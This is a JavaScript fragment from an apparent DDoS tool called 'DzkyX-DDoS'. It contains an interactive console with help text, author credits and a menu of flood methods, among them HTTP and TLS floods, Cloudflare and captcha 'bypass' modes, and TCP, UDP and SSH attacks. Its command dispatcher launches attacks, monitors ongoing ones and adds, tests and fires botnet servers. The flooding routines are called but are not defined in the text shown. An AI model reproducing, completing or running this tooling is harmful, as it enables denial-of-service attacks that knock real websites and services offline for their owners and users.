// [========================================] //

async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
Created And Coded Full By Dzky and PermenMD

Thx To:
Allah SWT
ChatGPT ( Fixing Error )
PermenMD( Provide Base Script )
Azzam ( Provide Base Script )
Member And User ( Ga Buat Yang Dapet Gratis )
My Family
PLN Dan Wifi
Github
YouTube ( Music )
`
permen.question(`${back_putih}${teksmerah}DzkyX-DDoS${Reset}➔ ${back_putih}${teksmerah}Console${Reset} ${back_putih}${teksmerah}►${Reset} `, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
| methods      | show list of available methods
| srvmenu      | show server menu
| attack       | launch ddos attack
| ongoing      | show ongoing attack
| news         | show latest permenmd news
| credits      | show creator of this tools
| cls          | clear terminal
| exit         | leave me if you get bored:(
`);
    sigma();
  } else if (command === 'methods') {
    console.log(`
[=========================================]
|| flood      || HTTP(s) Flood DoS
|| tls        || TLS 1.3 
|| strike     || Best DDoS methods
|| kill       || Bypass Cf DDoS methods
|| raw        || Huge RPS Flexing XD
|| bypass     || Bypass With High Power
|| thunder    || Massive Power Methods
|| storm      || The Raining Request
|| rape       || Bypass Protection
|| destroy    || Kill That Socket
|| slim       || Oh Is Fit There
|| quantum    || Bypass Protection
[=========================================]
`);
    sigma();
      } else if (command === 'srvmenu') {
    console.log(`
[=========================================]
|| srvattack  || Attack with Server
|| testsrv    ||  Checking Your Server
|| addsrv     || Add Server
┌────────────────────┬────────────────────────────┐  
│ METHODS            │ INFO                       │  
├────────────────────┼────────────────────────────┤  
│ HTTPS (VIP)        │ Layer 7                    │  
│ Strike             │ Layer 7                    │  
│ Bypass             │ Layer 7                    │  
│ TLS                │ Layer 7                    │  
│ Ninja              │ Layer 7                    │  
│ Mix                │ Layer 7                    │  
│ Raw                │ Layer 7                    │  
│ Cibi               │ Layer 7                    │  
│ Browser            │ Layer 7                    │  
│ Vsebypass/Vseflood │ Layer 7                    │  
│ Quantum            │ Layer 7                    │  
│ Rapid              │ Layer 7                    │  
│ Pidoras/Pidoras2   │ Layer 7                    │  
│ Storm              │ Layer 7                    │  
│ Glory (VIP)        │ Layer 7                    │  
│ UAM                │ Layer 7                    │  
│ Captcha (VIP)      │ Layer 7                    │  
│ TCP                │ Layer 4                    │  
│ UDP                │ Layer 4                    │  
│ SSH                │ Layer 4                    │  
└────────────────────┴────────────────────────────┘  
Layer 4 Use Command 'botnet'
Layer 7 Use Command 'srvattack'

`);

    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'attack') {
    handleAttackCommand(args);
  } else if (command === 'ongoing') {
    monitorOngoingAttacks()
  } else if (command === 'botnet') {
    AttackBotnet(args)
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'srvattack') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'exit') {
    process.exit(-1)
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()